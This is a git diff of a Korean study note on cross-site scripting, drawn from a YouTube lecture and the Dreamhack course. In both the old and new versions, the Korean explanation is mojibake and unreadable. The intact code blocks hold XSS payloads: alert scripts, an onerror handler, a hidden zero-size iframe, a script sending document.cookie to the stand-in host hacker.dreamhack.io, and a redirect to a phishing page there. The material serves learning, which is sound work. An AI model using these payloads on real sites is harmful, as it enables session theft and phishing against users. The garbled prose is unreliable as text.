@@ -1,16 +1,16 @@
-ì¶œì²˜ : https://www.youtube.com/watch?v=DoN7bkdQBXU
+ÃâÃ³ : https://www.youtube.com/watch?v=DoN7bkdQBXU
 
-<h1>XSS youtube ê°•ì˜ ìš”ì•½</h1>
+<h1>XSS youtube °­ÀÇ ¿ä¾à</h1>
 <h3>XSS : Cross Site Scripting</h3>
-<p>íŠ¹ì •í•œ scriptë¥¼ ì‚½ìž…í•˜ëŠ” ê³µê²©ì´ë‹¤.</p>
-<p>webì€ CSS, JSì™€ ê°™ì´ ë‹¤ì–‘í•œ ì»¨í…ì¸ ë“¤ì„ êµ¬ì„±í•¨ìœ¼ë¡œì¨ ë™ì ì´ê³  í™”ë ¤í•œ ì›¹íŽ˜ì´ì§€ë¥¼ êµ¬ì„±í•˜ëŠ” ê²ƒì´ ì¼ë°˜ì ì¸ë°, ì´ ì¤‘ ê°€ìž¥ ëŒ€í‘œì ì¸ ê²ƒ ê·¸ë¦¬ê³  ë˜ ê¸°ëŠ¥ì ìœ¼ë¡œë‚˜ ê°€ìž¥ ì¤‘ìš”í•œ ê²ƒì´ Javascriptë¶€ë¶„ì€ XSS ê³µê²©ì˜ ëŒ€ìƒì´ë‹¤.</p>
-<p>Javascript ì˜ ì‹œìŠ¤í…œ ì·¨ì•¼ì ì„ ì´ìš©í•´ì„œ íŠ¹ì • ì›¹ì‚¬ì´íŠ¸ì— ì–´ë–¤ scripting êµ¬ë¬¸ì„ ì‚½ìž…í•´ì„œ ìžì‹ ì˜ ì´ìµì„ ì·¨í•˜ê±°ë‚˜ í•´ë‹¹ ì‹œìŠ¤í…œì„ ë§ˆë¹„ì‹œí‚¤ê±°ë‚˜ ê°ì¢… ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê±°ë‚˜ í•˜ëŠ” ê³µê²© ê¸°ë²•ì´ ë°”ë¡œ XSS(Cross Site Scripting)</p>
+<p>Æ¯Á¤ÇÑ script¸¦ »ðÀÔÇÏ´Â °ø°ÝÀÌ´Ù.</p>
+<p>webÀº CSS, JS¿Í °°ÀÌ ´Ù¾çÇÑ ÄÁÅÙÃ÷µéÀ» ±¸¼ºÇÔÀ¸·Î½á µ¿ÀûÀÌ°í È­·ÁÇÑ À¥ÆäÀÌÁö¸¦ ±¸¼ºÇÏ´Â °ÍÀÌ ÀÏ¹ÝÀûÀÎµ¥, ÀÌ Áß °¡Àå ´ëÇ¥ÀûÀÎ °Í ±×¸®°í ¶Ç ±â´ÉÀûÀ¸·Î³ª °¡Àå Áß¿äÇÑ °ÍÀÌ JavascriptºÎºÐÀº XSS °ø°ÝÀÇ ´ë»óÀÌ´Ù.</p>
+<p>Javascript ÀÇ ½Ã½ºÅÛ Ãë¾ßÁ¡À» ÀÌ¿ëÇØ¼­ Æ¯Á¤ À¥»çÀÌÆ®¿¡ ¾î¶² scripting ±¸¹®À» »ðÀÔÇØ¼­ ÀÚ½ÅÀÇ ÀÌÀÍÀ» ÃëÇÏ°Å³ª ÇØ´ç ½Ã½ºÅÛÀ» ¸¶ºñ½ÃÅ°°Å³ª °¢Á¾ Á¤º¸¸¦ ¼öÁýÇÏ°Å³ª ÇÏ´Â °ø°Ý ±â¹ýÀÌ ¹Ù·Î XSS(Cross Site Scripting)</p>
 
-XSSëŠ” ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤.
+XSS´Â ´Ù¾çÇÑ ¹æ¹ýÀ¸·Î °ø°ÝÀÌ °¡´ÉÇÏ´Ù.
 
 ```html
 <script>
-    alert("XSS ê³µê²©!");
+    alert("XSS °ø°Ý!");
 </script>
 ```
 
@@ -19,21 +19,21 @@ XSSëŠ” ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤.
 ```
 
 ```html
-<img src="#" onerror="alert('XSS ê³µê²©!');">
+<img src="#" onerror="alert('XSS °ø°Ý!');">
 ```
 
 
-ì•„ìŠ¤í‚¤ì½”ë“œë¥¼ ì´ìš©í•˜ì—¬ ê³µê²©í•  ìˆ˜ë„ ìžˆë‹¤.
+¾Æ½ºÅ°ÄÚµå¸¦ ÀÌ¿ëÇÏ¿© °ø°ÝÇÒ ¼öµµ ÀÖ´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82067066-2d613080-970b-11ea-8294-371bd482959f.png)
 
-ì´ ë³€í™˜ëœ ì•„ìŠ¤í‚¤ì½”ë“œë¥¼ ì›¹ htmlì— ë§žëŠ” í˜•íƒœë¡œ ë§Œë“¤ì–´
+ÀÌ º¯È¯µÈ ¾Æ½ºÅ°ÄÚµå¸¦ À¥ html¿¡ ¸Â´Â ÇüÅÂ·Î ¸¸µé¾î
 
 ![image](https://user-images.githubusercontent.com/62539341/82067251-6b5e5480-970b-11ea-99e5-5cac16aaea97.png)
 
-XSS ê³µê²©ì´ ì‹¤í–‰ëœë‹¤. ì´ ë°©ë²•ì€ í•„í„°ë§ì´ ì¡°ê¸ˆ ë” ì–´ë ¤ì›Œ ë¹„êµì  ë” ê°•ë ¥í•œ XSS ê³µê²©ì´ë¼ê³  í•  ìˆ˜ ìžˆë‹¤.
+XSS °ø°ÝÀÌ ½ÇÇàµÈ´Ù. ÀÌ ¹æ¹ýÀº ÇÊÅÍ¸µÀÌ Á¶±Ý ´õ ¾î·Á¿ö ºñ±³Àû ´õ °­·ÂÇÑ XSS °ø°ÝÀÌ¶ó°í ÇÒ ¼ö ÀÖ´Ù.
 
-ì´ì œ ì¡°ê¸ˆ ë” ì‘ìš©í•´ë³´ìž.
+ÀÌÁ¦ Á¶±Ý ´õ ÀÀ¿ëÇØº¸ÀÚ.
 
 ```html
 <IFRAME ID = "showFRame" SRC="javascript:document.write('><script>
@@ -44,115 +44,115 @@ function show(){
 alert(4);
 </script>
 ');" width="0" height="0" frameborder="0"></IFRAME>
-<button id="button" onClice='document.getElementById("showFrame").contentWindow.show()'>ë²„íŠ¼</button>
+<button id="button" onClice='document.getElementById("showFrame").contentWindow.show()'>¹öÆ°</button>
 ```
 
-í¬ê¸°ê°€ 0ì´ê¸° ë•Œë¬¸ì— ìš°ë¦¬ ëˆˆì—” ë³´ì´ì§€ ì•Šì§€ë§Œ ì‹¤í–‰ì´ ë˜ëŠ” í•´í‚¹ ê³µê²©ì´ë‹¤.<br>
+Å©±â°¡ 0ÀÌ±â ¶§¹®¿¡ ¿ì¸® ´«¿£ º¸ÀÌÁö ¾ÊÁö¸¸ ½ÇÇàÀÌ µÇ´Â ÇØÅ· °ø°ÝÀÌ´Ù.<br>
 
-ì¶œì²˜ : https://dreamhack.io/learn/1
-<h1>XSS ê´€ë ¨ ë“œë¦¼í•µ ê°•ì¢Œ & ì‹¤ìŠµ</h1>
+ÃâÃ³ : https://dreamhack.io/learn/1
+<h1>XSS °ü·Ã µå¸²ÇÙ °­ÁÂ & ½Ç½À</h1>
 <h3>Cross Site Scripting</h3>
 
-<p>ì„œë²„ì˜ ì‘ë‹µì— ê³µê²©ìžê°€ ì‚½ìž…ëœ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë°›ì€ ì‚¬ìš©ìžì˜ ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½ì ì„ Cross Site Scripting (XSS)ë¼ê³  í•œë‹¤.</p>
+<p>¼­¹öÀÇ ÀÀ´ä¿¡ °ø°ÝÀÚ°¡ »ðÀÔµÈ ¾Ç¼º ½ºÅ©¸³Æ®¸¦ ¹ÞÀº »ç¿ëÀÚÀÇ À¥ ºê¶ó¿ìÀú¿¡¼­ ¾Ç¼º ½ºÅ©¸³Æ®°¡ ½ÇÇàµÇ´Â Ãë¾àÁ¡À» Cross Site Scripting (XSS)¶ó°í ÇÑ´Ù.</p>
 
-XSS ê³µê²©ì„ ì„±ê³µì ìœ¼ë¡œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ í•„ìš”í•œ 2ê°€ì§€ ì¡°ê±´
+XSS °ø°ÝÀ» ¼º°øÀûÀ¸·Î ¼öÇàÇÏ±â À§ÇØ¼­ ÇÊ¿äÇÑ 2°¡Áö Á¶°Ç
 
-1. <b>ìž…ë ¥ ë°ì´í„°ì— ëŒ€í•œ ì¶©ë¶„í•œ ê²€ì¦ ê³¼ì •ì´ ì—†ì–´ì•¼ í•œë‹¤.</b>
-    - ìž…ë ¥í•œ ë°ì´í„°ê°€ ì¶©ë¶„í•œ ê²€ì¦ ê³¼ì •ì´ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚½ìž…ë  ìˆ˜ ìžˆì–´ì•¼ í•œë‹¤.
-2. <b>ì„œë²„ì˜ ì‘ë‹µ ë°ì´í„°ê°€ ì›¹ ë¸Œë¼ìš°ì € ë‚´ íŽ˜ì´ì§€ì— ì¶œë ¥ ì‹œ ì¶©ë¶„í•œ ê²€ì¦ ê³¼ì •ì´ ì—†ì–´ì•¼ í•œë‹¤.</b>
-    - ì‘ë‹µ ë°ì´í„° ì¶œë ¥ ì‹œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì›¹ ë¸Œë¼ìš°ì €ì˜ ë Œë”ë§ ê³¼ì •ì— ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¸Œë¼ìš°ì €ê°€ ì‹¤í–‰í•  ìˆ˜ ìžˆëŠ” ì›¹ ë¦¬ì†ŒìŠ¤ë¥¼ ë§í•˜ë©°, ëŒ€í‘œì ìœ¼ë¡œ HTML, JS ë“±ì´ ìžˆë‹¤.
+1. <b>ÀÔ·Â µ¥ÀÌÅÍ¿¡ ´ëÇÑ ÃæºÐÇÑ °ËÁõ °úÁ¤ÀÌ ¾ø¾î¾ß ÇÑ´Ù.</b>
+    - ÀÔ·ÂÇÑ µ¥ÀÌÅÍ°¡ ÃæºÐÇÑ °ËÁõ °úÁ¤ÀÌ ÀÌ·ç¾îÁöÁö ¾Ê¾Æ ¾Ç¼º ½ºÅ©¸³Æ®°¡ »ðÀÔµÉ ¼ö ÀÖ¾î¾ß ÇÑ´Ù.
+2. <b>¼­¹öÀÇ ÀÀ´ä µ¥ÀÌÅÍ°¡ À¥ ºê¶ó¿ìÀú ³» ÆäÀÌÁö¿¡ Ãâ·Â ½Ã ÃæºÐÇÑ °ËÁõ °úÁ¤ÀÌ ¾ø¾î¾ß ÇÑ´Ù.</b>
+    - ÀÀ´ä µ¥ÀÌÅÍ Ãâ·Â ½Ã ¾Ç¼º ½ºÅ©¸³Æ®°¡ À¥ ºê¶ó¿ìÀúÀÇ ·»´õ¸µ °úÁ¤¿¡ ¾Ç¼º ½ºÅ©¸³Æ®´Â ºê¶ó¿ìÀú°¡ ½ÇÇàÇÒ ¼ö ÀÖ´Â À¥ ¸®¼Ò½º¸¦ ¸»ÇÏ¸ç, ´ëÇ¥ÀûÀ¸·Î HTML, JS µîÀÌ ÀÖ´Ù.
 
 ![image](https://user-images.githubusercontent.com/62539341/82070219-63a0af00-970f-11ea-9858-cf213c90d36e.png)
 
->XSS ì·¨ì•½ì ì— ëŒ€í•œ ì •ë³´ë¥¼ ê³µìœ í•  ë•Œ alert ë˜ëŠ” promptì™€ ê°™ì€ ë©”ì‹œì§€ ì°½ì„ ì‹¤í–‰í•˜ëŠ” ì´ìœ ëŠ” XSS ì·¨ì•½ì ì´ ë°œìƒí•˜ì˜€ë‹¤ëŠ” ì ì„ ì‹œê°ì ìœ¼ë¡œ í‘œí˜„ì´ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ìž…ë‹ˆë‹¤. ì£¼ë¡œ ë©”ì‹œì§€ ì°½ì—ëŠ” í•´ë‹¹ íŽ˜ì´ì§€ì˜ domainì„ í™•ì¸í•˜ê¸° ìœ„í•´ document.domainì„ ì¸ìžë¡œ ì¤ë‹ˆë‹¤.
+>XSS Ãë¾àÁ¡¿¡ ´ëÇÑ Á¤º¸¸¦ °øÀ¯ÇÒ ¶§ alert ¶Ç´Â prompt¿Í °°Àº ¸Þ½ÃÁö Ã¢À» ½ÇÇàÇÏ´Â ÀÌÀ¯´Â XSS Ãë¾àÁ¡ÀÌ ¹ß»ýÇÏ¿´´Ù´Â Á¡À» ½Ã°¢ÀûÀ¸·Î Ç¥ÇöÀÌ °¡´ÉÇÏ±â ¶§¹®ÀÔ´Ï´Ù. ÁÖ·Î ¸Þ½ÃÁö Ã¢¿¡´Â ÇØ´ç ÆäÀÌÁöÀÇ domainÀ» È®ÀÎÇÏ±â À§ÇØ document.domainÀ» ÀÎÀÚ·Î ÁÝ´Ï´Ù.
 
 <h3>XSS with Javascript</h3>
-<p>Javascript(ìžë°”ìŠ¤í¬ë¦½íŠ¸)ëŠ” ì‚¬ìš©ìžì˜ ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ í™”ë©´ì„ ë™ì ìœ¼ë¡œ ë³´ì—¬ì¤„ ìˆ˜ ìžˆë„ë¡ ìžë™ìœ¼ë¡œ ë²„íŠ¼ì„ ëˆ„ë¥´ê±°ë‚˜ í™”ë©´ êµ¬ì„±ì„ ë°”ê¾¸ëŠ” ë“±ì˜ ìž‘ì—…ì„ í•  ë•Œ ë§Žì´ ì‚¬ìš©ëœë‹¤. ì´ëŸ¬í•œ UIì ì¸ ì¸¡ë©´ ì™¸ì—ë„ ì‚¬ìš©ìžì™€ì˜ ìƒí˜¸ìž‘ìš© ì—†ì´ ì‚¬ìš©ìžì˜ ê¶Œí•œìœ¼ë¡œ ì •ë³´ë¥¼ ì¡°íšŒí•˜ê±°ë‚˜ ë³€ê²½í•˜ëŠ” ë“±ì˜ ìš”ì²­ì„ ì£¼ê³  ì‘ë‹µë°›ëŠ” ê²ƒë„ ê°€ëŠ¥í•˜ë‹¤. ì‚¬ìš©ìžì˜ ê¶Œí•œì„ ê°€ì§€ê³  ìžˆëŠ” ì„¸ì…˜ ì¿ í‚¤ëŠ” ì‚¬ìš©ìžì—ê²Œ ì €ìž¥ë˜ì–´ìžˆê³  ì›¹ ë¸Œë¼ìš°ì €ëŠ” í•´ë‹¹ ì¿ í‚¤ì— ì ‘ê·¼í•  ìˆ˜ ìžˆê¸° ë•Œë¬¸ì´ë‹¤.</p>
-<p>ì´ì™¸ì—ë„ ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì¶œë ¥ë˜ì–´ì§€ëŠ” íŽ˜ì´ì§€ì˜ ë‚´ìš©ì„ ì¡°ìž‘í•˜ê±°ë‚˜, ì›¹ ë¸Œë¼ìš°ì €ì˜ ìœ„ì¹˜ë¥¼ ê³µê²©ìžê°€ ì›í•˜ëŠ” ì£¼ì†Œë¡œ ë³€ê²½ ê°€ëŠ¥í•˜ë‹¤. ì´ì²˜ëŸ¼ ì‚¬ìš©ìžì˜ ìž…ìž¥ì—ì„œ ë°œìƒí•˜ëŠ” í–‰ìœ„ë¥¼ ë™ìž‘ ì‹œí‚¬ ìˆ˜ ìžˆê¸° ë•Œë¬¸ì— ìžë°”ìŠ¤í¬ë¦½íŠ¸ëŠ” XSS ê³µê²©ì— ë§Žì´ ì‚¬ìš©ëœë‹¤.</p>
-<p>ìžë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ëŒ€í‘œì ì¸ ë°©ë²•ì€ script íƒœê·¸ë¥¼ ì´ìš©í•˜ëŠ” ë°©ì‹ì´ ìžˆë‹¤. ê³µê²©ìžê°€ ìž…ë ¥ ë°ì´í„°ë¡œ script íƒœê·¸ë¥¼ ì „ì†¡ í•´ ë‹¤ë¥¸ ì‚¬ìš©ìžì˜ ì‘ë‹µì— í¬í•¨ë˜ë©´ ê³µê²©ìžì˜ ìžë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ëœë‹¤. script íƒœê·¸ ì™¸ì—ë„ íƒœê·¸ì˜ ì†ì„± ì¤‘ íŠ¹ì • ìƒí™©ì—ì„œ ë°œìƒí•˜ëŠ” on* ì´ë²¤íŠ¸ë“¤ì„ ì‚¬ìš©í•˜ì—¬ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì´ ê°€ëŠ¥.</p>
+<p>Javascript(ÀÚ¹Ù½ºÅ©¸³Æ®)´Â »ç¿ëÀÚÀÇ À¥ ºê¶ó¿ìÀú¿¡¼­ È­¸éÀ» µ¿ÀûÀ¸·Î º¸¿©ÁÙ ¼ö ÀÖµµ·Ï ÀÚµ¿À¸·Î ¹öÆ°À» ´©¸£°Å³ª È­¸é ±¸¼ºÀ» ¹Ù²Ù´Â µîÀÇ ÀÛ¾÷À» ÇÒ ¶§ ¸¹ÀÌ »ç¿ëµÈ´Ù. ÀÌ·¯ÇÑ UIÀûÀÎ Ãø¸é ¿Ü¿¡µµ »ç¿ëÀÚ¿ÍÀÇ »óÈ£ÀÛ¿ë ¾øÀÌ »ç¿ëÀÚÀÇ ±ÇÇÑÀ¸·Î Á¤º¸¸¦ Á¶È¸ÇÏ°Å³ª º¯°æÇÏ´Â µîÀÇ ¿äÃ»À» ÁÖ°í ÀÀ´ä¹Þ´Â °Íµµ °¡´ÉÇÏ´Ù. »ç¿ëÀÚÀÇ ±ÇÇÑÀ» °¡Áö°í ÀÖ´Â ¼¼¼Ç ÄíÅ°´Â »ç¿ëÀÚ¿¡°Ô ÀúÀåµÇ¾îÀÖ°í À¥ ºê¶ó¿ìÀú´Â ÇØ´ç ÄíÅ°¿¡ Á¢±ÙÇÒ ¼ö ÀÖ±â ¶§¹®ÀÌ´Ù.</p>
+<p>ÀÌ¿Ü¿¡µµ À¥ ºê¶ó¿ìÀú¿¡¼­ Ãâ·ÂµÇ¾îÁö´Â ÆäÀÌÁöÀÇ ³»¿ëÀ» Á¶ÀÛÇÏ°Å³ª, À¥ ºê¶ó¿ìÀúÀÇ À§Ä¡¸¦ °ø°ÝÀÚ°¡ ¿øÇÏ´Â ÁÖ¼Ò·Î º¯°æ °¡´ÉÇÏ´Ù. ÀÌÃ³·³ »ç¿ëÀÚÀÇ ÀÔÀå¿¡¼­ ¹ß»ýÇÏ´Â ÇàÀ§¸¦ µ¿ÀÛ ½ÃÅ³ ¼ö ÀÖ±â ¶§¹®¿¡ ÀÚ¹Ù½ºÅ©¸³Æ®´Â XSS °ø°Ý¿¡ ¸¹ÀÌ »ç¿ëµÈ´Ù.</p>
+<p>ÀÚ¹Ù½ºÅ©¸³Æ®¸¦ ½ÇÇàÇÏ´Â ´ëÇ¥ÀûÀÎ ¹æ¹ýÀº script ÅÂ±×¸¦ ÀÌ¿ëÇÏ´Â ¹æ½ÄÀÌ ÀÖ´Ù. °ø°ÝÀÚ°¡ ÀÔ·Â µ¥ÀÌÅÍ·Î script ÅÂ±×¸¦ Àü¼Û ÇØ ´Ù¸¥ »ç¿ëÀÚÀÇ ÀÀ´ä¿¡ Æ÷ÇÔµÇ¸é °ø°ÝÀÚÀÇ ÀÚ¹Ù½ºÅ©¸³Æ®°¡ ½ÇÇàµÈ´Ù. script ÅÂ±× ¿Ü¿¡µµ ÅÂ±×ÀÇ ¼Ó¼º Áß Æ¯Á¤ »óÈ²¿¡¼­ ¹ß»ýÇÏ´Â on* ÀÌº¥Æ®µéÀ» »ç¿ëÇÏ¿© ÀÚ¹Ù½ºÅ©¸³Æ® ½ÇÇàÀÌ °¡´É.</p>
 
 ```html
 <script>
-// "hello" ë¬¸ìžì—´ alert ì‹¤í–‰.
+// "hello" ¹®ÀÚ¿­ alert ½ÇÇà.
 alert("hello");
-// í˜„ìž¬ íŽ˜ì´ì§€ì˜ ì¿ í‚¤(return type: string)
+// ÇöÀç ÆäÀÌÁöÀÇ ÄíÅ°(return type: string)
 document.cookie; 
-// í˜„ìž¬ íŽ˜ì´ì§€ì˜ ì¿ í‚¤ë¥¼ ì¸ìžë¡œ ê°€ì§„ alert ì‹¤í–‰.
+// ÇöÀç ÆäÀÌÁöÀÇ ÄíÅ°¸¦ ÀÎÀÚ·Î °¡Áø alert ½ÇÇà.
 alert(document.cookie);
-// ì¿ í‚¤ ìƒì„±(key: name, value: test)
+// ÄíÅ° »ý¼º(key: name, value: test)
 document.cookie = "name=test;";
-// new Image() ëŠ” ì´ë¯¸ì§€ë¥¼ ìƒì„±í•˜ëŠ” í•¨ìˆ˜ì´ë©°, srcëŠ” ì´ë¯¸ì§€ì˜ ì£¼ì†Œë¥¼ ì§€ì •. ê³µê²©ìž ì£¼ì†ŒëŠ” http://hacker.dreamhack.io
-// "http://hacker.dreamhack.io/?cookie=í˜„ìž¬íŽ˜ì´ì§€ì˜ì¿ í‚¤" ì£¼ì†Œë¥¼ ìš”ì²­í•˜ê¸° ë•Œë¬¸ì— ê³µê²©ìž ì£¼ì†Œë¡œ í˜„ìž¬ íŽ˜ì´ì§€ì˜ ì¿ í‚¤ ìš”ì²­í•¨
+// new Image() ´Â ÀÌ¹ÌÁö¸¦ »ý¼ºÇÏ´Â ÇÔ¼öÀÌ¸ç, src´Â ÀÌ¹ÌÁöÀÇ ÁÖ¼Ò¸¦ ÁöÁ¤. °ø°ÝÀÚ ÁÖ¼Ò´Â http://hacker.dreamhack.io
+// "http://hacker.dreamhack.io/?cookie=ÇöÀçÆäÀÌÁöÀÇÄíÅ°" ÁÖ¼Ò¸¦ ¿äÃ»ÇÏ±â ¶§¹®¿¡ °ø°ÝÀÚ ÁÖ¼Ò·Î ÇöÀç ÆäÀÌÁöÀÇ ÄíÅ° ¿äÃ»ÇÔ
 new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
 </script>
 ```
 
 ```html
 <script>
-// ì‚¬ìš©ìžì˜ íŽ˜ì´ì§€ ì •ë³´ì— ì ‘ê·¼.
+// »ç¿ëÀÚÀÇ ÆäÀÌÁö Á¤º¸¿¡ Á¢±Ù.
 document;
-// ì‚¬ìš©ìžì˜ íŽ˜ì´ì§€ì— ë°ì´í„°ë¥¼ ì‚½ìž….
+// »ç¿ëÀÚÀÇ ÆäÀÌÁö¿¡ µ¥ÀÌÅÍ¸¦ »ðÀÔ.
 document.write("Hacked By DreamHack !");
 </script>
 ```
 
 ```html
 <script>
-// ì‚¬ìš©ìžì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½.
-// í”¼ì‹± ê³µê²© ë“±ìœ¼ë¡œ ì‚¬ìš©ë¨.
+// »ç¿ëÀÚÀÇ À§Ä¡¸¦ º¯°æ.
+// ÇÇ½Ì °ø°Ý µîÀ¸·Î »ç¿ëµÊ.
 location.href = "http://hacker.dreamhack.io/phishing"; 
-// ìƒˆ ì°½ ì—´ê¸°
+// »õ Ã¢ ¿­±â
 window.open("http://hacker.dreamhack.io/")
 </script>
 ```
 
 <h3>Stored XSS</h3>
-<p>Stored XSSëŠ” ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì„œë²„ ë‚´ì— ì¡´ìž¬í•˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ë˜ëŠ” íŒŒì¼ ë“±ì˜ í˜•íƒœë¡œ ì €ìž¥ë˜ì–´ ìžˆë‹¤ê°€ ì‚¬ìš©ìžê°€ ì €ìž¥ëœ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¡°íšŒí•˜ëŠ” ìˆœê°„ ë°œìƒí•˜ëŠ” í˜•íƒœì˜ XSS. ëŒ€í‘œì ìœ¼ë¡œ ê²Œì‹œíŒ ì„œë¹„ìŠ¤ì—ì„œ ìž‘ì„±ëœ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ëŠ” ê³¼ì •ì—ì„œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨ëœ ê²Œì‹œë¬¼ì„ ì¡°íšŒí•  ë•Œ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ëŠ” ê³µê²© ë°©ì‹ì´ ìžˆë‹¤.</p>
+<p>Stored XSS´Â ¾Ç¼º ½ºÅ©¸³Æ®°¡ ¼­¹ö ³»¿¡ Á¸ÀçÇÏ´Â µ¥ÀÌÅÍº£ÀÌ½º ¶Ç´Â ÆÄÀÏ µîÀÇ ÇüÅÂ·Î ÀúÀåµÇ¾î ÀÖ´Ù°¡ »ç¿ëÀÚ°¡ ÀúÀåµÈ ¾Ç¼º ½ºÅ©¸³Æ®¸¦ Á¶È¸ÇÏ´Â ¼ø°£ ¹ß»ýÇÏ´Â ÇüÅÂÀÇ XSS. ´ëÇ¥ÀûÀ¸·Î °Ô½ÃÆÇ ¼­ºñ½º¿¡¼­ ÀÛ¼ºµÈ °Ô½Ã¹°À» È®ÀÎÇÏ´Â °úÁ¤¿¡¼­ ¾Ç¼º ½ºÅ©¸³Æ®°¡ Æ÷ÇÔµÈ °Ô½Ã¹°À» Á¶È¸ÇÒ ¶§ ¾Ç¼º ½ºÅ©¸³Æ®°¡ ½ÇÇàµÇ´Â °ø°Ý ¹æ½ÄÀÌ ÀÖ´Ù.</p>
 
 <p>
-ì„œë¹„ìŠ¤ì˜ í˜•íƒœì™€ ì ‘ê·¼ì„±, ê·¸ë¦¬ê³  í•´ë‹¹ ì„œë¹„ìŠ¤ë¥¼ í†µí•´ ì–»ì„ ìˆ˜ ìžˆëŠ” ì •ë³´ ë˜ëŠ” í–‰ìœ„ë“¤ì— ë”°ë¼ íŒŒê¸‰ë ¥ì€ ë‹¬ë¼ì§ˆ ìˆ˜ ìžˆë‹¤.</p>
+¼­ºñ½ºÀÇ ÇüÅÂ¿Í Á¢±Ù¼º, ±×¸®°í ÇØ´ç ¼­ºñ½º¸¦ ÅëÇØ ¾òÀ» ¼ö ÀÖ´Â Á¤º¸ ¶Ç´Â ÇàÀ§µé¿¡ µû¶ó ÆÄ±Þ·ÂÀº ´Þ¶óÁú ¼ö ÀÖ´Ù.</p>
 
 <h3>Reflected XSS</h3>
-<p>Reflected XSSëŠ” ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚¬ìš©ìžì˜ ìš”ì²­ ì‹œ ì „ì†¡ë˜ëŠ” í˜•íƒœ. ì‚¬ìš©ìžì˜ ìš”ì²­ ë°ì´í„°ê°€ ì„œë²„ì˜ ì‘ë‹µì— í¬í•¨ë˜ëŠ” ê³¼ì •ì—ì„œ HTML ë“±ì˜ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ê·¸ëŒ€ë¡œ ì¶œë ¥ë˜ì–´ ë°œìƒí•œë‹¤.</p>
+<p>Reflected XSS´Â ¾Ç¼º ½ºÅ©¸³Æ®°¡ »ç¿ëÀÚÀÇ ¿äÃ» ½Ã Àü¼ÛµÇ´Â ÇüÅÂ. »ç¿ëÀÚÀÇ ¿äÃ» µ¥ÀÌÅÍ°¡ ¼­¹öÀÇ ÀÀ´ä¿¡ Æ÷ÇÔµÇ´Â °úÁ¤¿¡¼­ HTML µîÀÇ ¾Ç¼º ½ºÅ©¸³Æ®°¡ ±×´ë·Î Ãâ·ÂµÇ¾î ¹ß»ýÇÑ´Ù.</p>
 <p>
-Reflected XSSëŠ” Stored XSSì™€ëŠ” ë‹¤ë¥´ê²Œ ì‚¬ìš©ìžì˜ ìš”ì²­ ë°ì´í„°ì— ì˜í•´ ì·¨ì•½ì ì´ ë°œìƒí•˜ê¸° ë•Œë¬¸ì—, ë³€ì¡°ëœ ë°ì´í„°ê°€ ì‚¬ìš©ìžì˜ ìš”ì²­ìœ¼ë¡œ ì „ì†¡ë˜ëŠ” í˜•íƒœë¥¼ ìœ ë„í•´ì•¼ í•œë‹¤. ê°€ìž¥ ê°„ë‹¨í•œ ë°©ë²•ìœ¼ë¡œëŠ” íŠ¹ì • ë§í¬ë¥¼ ìœ ë„í•˜ëŠ” ë°©ì‹ì´ ì¡´ìž¬í•˜ë©° Click Jacking, Open Redirect ë“±ì˜ ë‹¤ë¥¸ ì·¨ì•½ì ê³¼ ì—°ê³„í•˜ì—¬ ë°œìƒì‹œí‚¤ëŠ” ë°©ë²•ë„ ì¡´ìž¬í•œë‹¤.</p>
+Reflected XSS´Â Stored XSS¿Í´Â ´Ù¸£°Ô »ç¿ëÀÚÀÇ ¿äÃ» µ¥ÀÌÅÍ¿¡ ÀÇÇØ Ãë¾àÁ¡ÀÌ ¹ß»ýÇÏ±â ¶§¹®¿¡, º¯Á¶µÈ µ¥ÀÌÅÍ°¡ »ç¿ëÀÚÀÇ ¿äÃ»À¸·Î Àü¼ÛµÇ´Â ÇüÅÂ¸¦ À¯µµÇØ¾ß ÇÑ´Ù. °¡Àå °£´ÜÇÑ ¹æ¹ýÀ¸·Î´Â Æ¯Á¤ ¸µÅ©¸¦ À¯µµÇÏ´Â ¹æ½ÄÀÌ Á¸ÀçÇÏ¸ç Click Jacking, Open Redirect µîÀÇ ´Ù¸¥ Ãë¾àÁ¡°ú ¿¬°èÇÏ¿© ¹ß»ý½ÃÅ°´Â ¹æ¹ýµµ Á¸ÀçÇÑ´Ù.</p>
 <p>
